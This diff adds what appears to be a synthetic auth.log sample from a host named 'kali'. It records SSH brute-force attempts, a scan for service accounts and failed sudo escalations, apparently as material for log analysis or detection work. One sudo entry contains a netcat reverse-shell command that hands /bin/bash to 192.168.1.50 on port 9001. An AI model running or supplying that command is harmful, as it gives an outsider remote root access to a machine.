@@ -1,0 +1,20 @@
+Jul 14 08:15:32 kali sshd[12345]: Failed password for root from 192.168.1.100 port 44287 ssh2
+Jul 14 08:15:33 kali sshd[12346]: Failed password for root from 192.168.1.100 port 44288 ssh2
+Jul 14 08:15:34 kali sshd[12347]: Failed password for root from 192.168.1.100 port 44289 ssh2
+Jul 14 08:15:35 kali sshd[12348]: Failed password for root from 192.168.1.100 port 44290 ssh2
+Jul 14 08:15:36 kali sshd[12349]: Failed password for root from 192.168.1.100 port 44291 ssh2
+Jul 14 08:15:37 kali sshd[12350]: Failed password for root from 192.168.1.100 port 44292 ssh2
+Jul 14 08:15:38 kali sshd[12351]: Failed password for admin from 192.168.1.100 port 44293 ssh2
+Jul 14 08:20:45 kali sudo: kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/bin/bash
+Jul 14 08:25:12 kali sshd[12355]: Accepted publickey for kali from 10.0.0.50 port 45287 ssh2
+Jul 14 08:30:21 kali sudo: kali : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/su -
+Jul 14 08:35:45 kali sshd[12356]: Failed password for guest from 172.16.0.10 port 44310 ssh2
+Jul 14 08:35:46 kali sshd[12357]: Failed password for guest from 172.16.0.10 port 44311 ssh2
+Jul 14 08:35:47 kali sshd[12358]: Failed password for guest from 172.16.0.10 port 44312 ssh2
+Jul 14 08:40:12 kali sudo: kali : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nc -e /bin/bash 192.168.1.50 9001
+Jul 14 08:45:33 kali sshd[12359]: Accepted password for admin from 10.0.0.20 port 45300 ssh2
+Jul 14 08:50:18 kali sudo: admin : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Jul 14 08:55:22 kali sshd[12360]: Failed password for invalid user mysql from 192.168.1.200 port 44320 ssh2
+Jul 14 08:55:23 kali sshd[12361]: Failed password for invalid user postgres from 192.168.1.200 port 44321 ssh2
+Jul 14 08:55:24 kali sshd[12362]: Failed password for invalid user apache from 192.168.1.200 port 44322 ssh2
+Jul 14 09:00:00 kali sshd[12363]: Accepted publickey for developer from 10.0.0.80 port 45350 ssh2
